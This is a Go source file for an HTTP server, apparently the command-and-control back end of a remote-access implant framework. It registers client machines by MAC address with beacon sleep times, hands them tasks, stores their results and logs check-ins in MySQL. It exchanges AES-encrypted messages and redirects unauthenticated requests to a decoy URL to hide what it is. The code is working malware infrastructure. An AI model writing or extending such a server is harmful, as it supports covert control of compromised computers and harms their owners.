package main

import (
	"Faygo/server/module/cipher"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"time"

	"github.com/gin-gonic/gin"
	"gorm.io/driver/mysql"
	"gorm.io/gorm"
)

//核心 gin框架
//
func StartHttpServer() {
	router := gin.Default()
	router.GET("/", HttpGet)
	router.POST("/", HttpPost)
	router.Run(":5000")
}

// 以下为Get默认路由
func HttpGet(c *gin.Context) {
	// c.String(http.StatusOK, "{\"0\":\"0\"}")
	c.Redirect(302, redirecturl)
}

// 以下为POST 获取body 返回response
func HttpPost(c *gin.Context) {
	body, err := ioutil.ReadAll(c.Request.Body)
	if err != nil {
		c.JSON(http.StatusOK, gin.H{
			"error": err,
		})
	} else {
		posttask := Task{}
		posttask.Json2Struct(AesDeCode(string(body)))
		if posttask.Mac == "" {
			c.Redirect(302, redirecturl)

		} else {
			response := DealRequests(string(body))
			//debug
			fmt.Println("response:", response)
			c.String(http.StatusOK, response)
		}

	}
}

//Aes加解密
//
func AesEnCode(str string) string {
	bytestr := []byte(str)
	cryptstr, err := cipher.AesCbcEncrypt(bytestr, []byte(AesKey))
	if err != nil {
		fmt.Println(err)
	}
	return base64.StdEncoding.EncodeToString(cryptstr)
}

func AesDeCode(str string) string {
	bytestr, _ := base64.StdEncoding.DecodeString(str)
	//decoded, err := base64.StdEncoding.DecodeString(encoded)
	decryptstr, err := cipher.AesCbcDecrypt(bytestr, []byte(AesKey))
	if err != nil {
		fmt.Println(err)
	}
	return string(decryptstr)
}

//JSON Struct 转换
//
func Struct2Json(clientstruct interface{}) string {
	json, _ := json.Marshal(clientstruct) //字节流
	return string(json)
}

func (client *Client) Json2Struct(clientjson string) {
	jsontmp := string(clientjson)
	json.Unmarshal([]byte(jsontmp), client)
}

func (task *Task) Json2Struct(clientjson string) {
	jsontmp := string(clientjson)
	json.Unmarshal([]byte(jsontmp), task)
}

//数据库操作

func InitClient(client Client) bool {
	db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
	if err != nil {
		fmt.Println(err)
	}
	client.Sleep = defaultsleep //默认休眠时间
	client.Status = 1           //默认状态码1
	result := db.Table("client").Create(&client)
	if err != nil {
		fmt.Println(result)
		return false
	} else {
		return true
	}

}

func (task *Task) GetTask() {
	db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
	if err != nil {
		fmt.Println(err)
	}
	db.Table("client").Where("mac = ?", task.Mac).Find(&task)

}

// type Geter interface{

// }

func (task *Task) UpdataTask() {
	db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
	if err != nil {
		fmt.Println(err)
	}
	// 修改任务状态
	task.Status = 1
	//db.Table("client").Model(&Task{}).Where("mac = ?", task.Mac).Update("result", task.Result)
	db.Table("client").Model(&Task{}).Where("mac = ?", task.Mac).Omit("mac").Updates(task) //不更新status

}

func (task *Task) UpdataTime() {
	db, err := gorm.Open(mysql.Open(dsn), &gorm.Config{})
	if err != nil {
		fmt.Println(err)
	}
	tasktime := TaskTime{Mac: task.Mac, LatestTime: GetTime()}

	//db.Table("client").Model(&Task{}).Where("mac = ?", task.Mac).Update("result", task.Result)
	db.Table("client").Model(&TaskTime{}).Where("mac = ?", tasktime.Mac).Updates(tasktime)

}

///
func GetTime() string {
	return time.Now().Format("2006-01-02 15:04:05")
}
